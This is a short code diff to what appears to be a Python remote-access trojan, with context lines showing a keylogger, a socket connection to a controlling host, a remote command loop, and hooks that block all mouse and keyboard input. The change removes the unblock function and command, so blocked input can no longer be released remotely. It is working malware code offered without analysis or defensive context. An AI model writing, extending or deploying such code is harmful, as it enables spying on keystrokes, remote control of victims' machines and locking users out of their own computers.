@@ -36,9 +36,6 @@ def manageLoggedKeys():
 def setBlock(event):    
     return False    
     
-def setUnblock(event):    
-    return True    
-    
 def blockInput():    
     hookManager = pyHook.HookManager()    
     hookManager.MouseAll = setBlock    
@@ -47,14 +44,6 @@ def blockInput():
     hookManager.HookKeyboard()    
     pythoncom.PumpMessages()    
     
-def unblockInput():    
-    hookManager = pyHook.HookManager()    
-    hookManager.MouseAll = setUnblock    
-    hookManager.KeyAll = setUnblock    
-    hookManager.HookMouse()    
-    hookManager.HookKeyboard()    
-    pythoncom.PumpMessages()  
-
 def connect((host, port)):
 	socketHolder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	socketHolder.connect((host, port))
@@ -70,8 +59,6 @@ def run_shell_cmd(socketHolder):
                      manageLoggedKeys()
                 elif data == 'blockInput':
                         blockInput()
-                elif data == 'unblockInput':
-                        unblockInput()
                 elif len(data) == 0:
 			return True
 		else:
